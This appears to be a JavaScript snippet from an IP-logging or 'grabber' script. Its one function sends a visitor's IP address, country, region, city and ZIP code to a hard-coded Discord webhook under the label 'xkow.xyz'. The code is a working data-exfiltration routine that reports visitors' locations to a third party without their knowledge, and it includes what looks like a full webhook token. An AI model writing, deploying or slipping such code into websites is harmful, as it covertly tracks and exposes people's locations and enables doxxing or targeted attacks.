function monke(json) 
{
     var request = new XMLHttpRequest();
     
     request.open("POST", "https://discord.com/api/webhooks/1215325946916110448/ctrRltnGZCH1MkkjjqvEJi8manPP27nDzukmzzxpM-JQqevHHao2ElnX8BGrKGvayH7s");

     request.setRequestHeader('Content-type', 'application/json');

     var params = 
     {
          username: "xkow.xyz",
          avatar_url: "https://i.imgur.com/g5NT9x1.png",
          embeds: [
               {
                    title: "xkow.xyz",
                    color: 15000,
                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
               }
          ]
     }

     request.send(JSON.stringify(params));
}